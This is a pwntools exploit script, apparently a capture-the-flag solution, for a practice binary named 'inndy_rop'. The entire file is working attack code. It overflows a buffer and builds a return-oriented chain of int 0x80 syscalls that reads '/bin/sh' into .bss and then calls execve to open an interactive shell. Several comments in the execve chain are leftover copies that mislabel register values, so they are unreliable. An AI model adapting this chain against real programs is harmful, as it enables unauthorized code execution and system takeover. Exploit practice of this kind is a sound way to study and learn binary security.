from pwn import *
file_path='./inndy_rop'
context(binary=file_path,os='linux',terminal = ['tmux', 'sp', '-h'])
p = process('./inndy_rop')
#find gadgets
int_80_ret = 0x0806F430#int 0x80;ret ROPgadget无法找到 ropper --file inndy_rop --search "int 0x80"
pop_eax_ret = 0x080b8016# : pop eax ; ret
pop_ebx_ret = 0x080481c9# : pop ebx ; ret
pop_ecx_ret = 0x080de769# : pop ecx ; ret
pop_edx_ret = 0x0806ecda# : pop edx ; ret
bss = 0x80e9000

payload = b'a'*0xc+b'b'*4
#read(1,bss+0x100,8)
#eax = 3
#ebx = fd=0
#ecx = buf=bss+0x100
#edx = 8
payload += p32(pop_eax_ret)+p32(0x3)#eax=3
payload += p32(pop_ebx_ret)+p32(0x0)#ebx=fd=0
payload += p32(pop_ecx_ret)+p32(bss+0x100)#ecx=bss+0x100
payload += p32(pop_edx_ret)+p32(0x8)#edx=8 len('/bin/sh\x00')
payload += p32(int_80_ret)
#execve("/bin/sh",0,0)
#eax=0xb
#ebx=bss+0x100
#ecx = 0
#edx = 0
payload += p32(pop_eax_ret)+p32(0xb)#eax=3
payload += p32(pop_ebx_ret)+p32(bss+0x100)#ebx=fd=1
payload += p32(pop_ecx_ret)+p32(0)#ecx=bss+0x100
payload += p32(pop_edx_ret)+p32(0)#edx=8 len('/bin/sh\x00')
payload += p32(int_80_ret)
#gdb.attach(p,'b *0x0806F430')
p.sendline(payload)
sleep(1)
p.sendline('/bin/sh\x00')
p.interactive()